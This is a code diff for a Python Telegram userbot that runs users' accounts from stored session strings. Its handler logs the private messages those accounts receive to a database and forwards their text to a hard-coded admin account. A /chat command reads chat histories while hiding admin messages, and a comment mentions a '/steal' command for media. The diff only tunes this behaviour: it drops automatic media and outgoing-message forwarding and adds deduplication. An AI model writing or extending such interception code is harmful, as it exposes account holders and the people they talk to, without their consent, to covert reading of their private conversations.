@@ -12,7 +12,7 @@ from threading import Thread
 from flask import Flask, jsonify
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.tl.types import UserStatusOnline, UserStatusOffline
+from telethon.tl.types import UserStatusOnline, UserStatusOffline, MessageService
 from telethon.tl.functions.account import UpdateStatusRequest
 from aiogram import Bot, Dispatcher, types as aiogram_types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile, ReplyKeyboardMarkup, KeyboardButton
@@ -136,10 +136,10 @@ def get_code_keyboard():
     )
     return kb
 
-async def export_chat_to_html(client, chat_id, chat_name, me, limit=500):
+async def export_chat_to_html(client, chat_id, chat_name, me, limit=1000):
     messages = []
     async for msg in client.iter_messages(chat_id, limit=limit):
-        if msg.text:
+        if msg.text and not isinstance(msg, MessageService):
             try:
                 if msg.out:
                     sender_name = f"{me.first_name} (Вы)"
@@ -457,9 +457,9 @@ async def cmd_chat(message):
     parts = args.split()
     target = parts[0]
     limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 30
-    if limit > 1000:
-        limit = 1000
-        await message.answer("⚠️ Лимит ограничен 1000 сообщениями")
+    if limit > 500:
+        limit = 500
+        await message.answer("⚠️ Лимит ограничен 500 для быстрой загрузки")
     
     cl, uid = get_active_client()
     if not cl:
@@ -472,13 +472,20 @@ async def cmd_chat(message):
         return
     
     target_name = ent.first_name or ent.username or target
-    await message.answer(f"🔄 Загружаю последние {limit} сообщений...")
+    
+    status = await message.answer(f"🔄 Загружаю {limit} сообщений...")
+    
+    messages = await cl.get_messages(ent.id, limit=limit)
     
     msgs = []
-    async for msg in cl.iter_messages(ent.id, limit=limit):
-        if msg.text:
+    for msg in messages:
+        if msg.text and not isinstance(msg, MessageService):
             try:
-                sn = "👉 Я" if msg.out else (await cl.get_entity(msg.sender_id)).first_name or str(msg.sender_id)
+                if msg.out:
+                    sn = "👉 Я"
+                else:
+                    sender = await cl.get_entity(msg.sender_id)
+                    sn = sender.first_name or sender.username or str(msg.sender_id)
                 if is_target_admin(msg.sender_id if not msg.out else 0):
                     continue
                 dt = msg.date.strftime('%d.%m %H:%M')
@@ -486,14 +493,13 @@ async def cmd_chat(message):
             except:
                 msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:300]}")
     
+    await status.delete()
+    
     if msgs:
         text = f"💬 <b>{target_name}</b> (последние {len(msgs)})\n\n" + "\n".join(reversed(msgs))
         if len(text) > 4000:
-            for i in range(0, len(msgs), 50):
-                part = "\n".join(reversed(msgs[i:i+50]))
-                await message.answer(f"💬 <b>{target_name}</b>\n\n{part}", parse_mode='HTML')
-        else:
-            await message.answer(text, parse_mode='HTML')
+            text = text[:3900] + "\n\n... (обрезано)"
+        await message.answer(text, parse_mode='HTML')
     else:
         await message.answer("📭 Нет сообщений")
 
@@ -820,55 +826,64 @@ async def run_userbot(owner_id, session_string):
     cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
     muted_users = {row[0] for row in cursor.fetchall()}
     
+    # Антиспам защита
+    last_processed = {}
+    
     @client.on(events.NewMessage)
     async def handle_incoming(event):
+        nonlocal last_processed
+        
+        # Пропускаем служебные сообщения и сервисные
+        if isinstance(event.message, MessageService):
+            return
+        
+        # Только личные сообщения (не группы, не каналы, не боты)
         if not event.is_private:
             return
         
-        if not event.out:
-            sender_id = event.sender_id
-            if sender_id in muted_users:
-                await event.delete()
-                return
+        # Пропускаем сообщения от самого себя (out)
+        if event.out:
+            return
+        
+        sender_id = event.sender_id
+        if not sender_id:
+            return
+        
+        # Антидубль
+        msg_hash = f"{event.chat_id}_{event.id}"
+        if msg_hash in last_processed:
+            return
+        last_processed[msg_hash] = datetime.now().timestamp()
+        if len(last_processed) > 100:
+            now = datetime.now().timestamp()
+            last_processed = {k: v for k, v in last_processed.items() if now - v < 60}
+        
+        # Проверка на заглушку
+        if sender_id in muted_users:
+            await event.delete()
+            return
+        
+        # Обработка ТОЛЬКО текстовых сообщений от ЛЮДЕЙ (не ботов)
+        if event.text and event.text.strip():
+            # Сохраняем в БД
+            saved_messages[owner_id][event.id] = {'sender_id': sender_id, 'text': event.text}
+            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
+                          (owner_id, event.id, sender_id, event.text, datetime.now().isoformat()))
+            conn.commit()
             
-            if event.text:
-                saved_messages[owner_id][event.id] = {'sender_id': sender_id, 'text': event.text}
-                cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
-                              (owner_id, event.id, sender_id, event.text, datetime.now().isoformat()))
-                conn.commit()
-                
-                if is_admin(owner_id):
-                    try:
-                        sender = await client.get_entity(sender_id)
-                        name = sender.first_name or sender.username or str(sender_id)
-                        await send_to_admin(f"📩 [{me.first_name}] ← {name}:\n{event.text[:300]}")
-                    except:
-                        pass
-            
-            if event.photo or event.video or event.voice or event.video_note or event.sticker or event.document:
+            # Отправляем админу ТОЛЬКО если владелец аккаунта - админ
+            if is_admin(owner_id):
                 try:
-                    path = await event.download_media()
-                    if path and is_admin(owner_id):
-                        try:
-                            sender = await client.get_entity(sender_id)
-                            name = sender.first_name or str(sender_id)
-                        except:
-                            name = str(sender_id)
-                        await send_to_admin(f"📎 [{me.first_name}] ← {name}: медиа")
-                        with open(path, 'rb') as f:
-                            await bot.send_document(ADMIN_IDS[0], InputFile(f, filename=os.path.basename(path)), caption=f"Медиа от {name}")
-                        os.remove(path)
+                    sender = await client.get_entity(sender_id)
+                    # Проверяем что отправитель - человек, а не бот
+                    if not getattr(sender, 'bot', False):
+                        name = sender.first_name or sender.username or str(sender_id)
+                        await send_to_admin(f"💬 [{me.first_name}] ← {name}:\n{event.text[:300]}")
                 except:
                     pass
         
-        if event.out and event.text and is_admin(owner_id):
-            try:
-                if event.chat_id and event.chat_id != owner_id:
-                    chat_entity = await client.get_entity(event.chat_id)
-                    chat_name = chat_entity.first_name or chat_entity.username or str(event.chat_id)
-                    await send_to_admin(f"📤 [{me.first_name}] → {chat_name}:\n{event.text[:300]}")
-            except:
-                pass
+        # Медиа вообще не логируем и не скачиваем автоматически
+        # Только по команде /steal
     
     @client.on(events.NewMessage)
     async def user_commands(event):
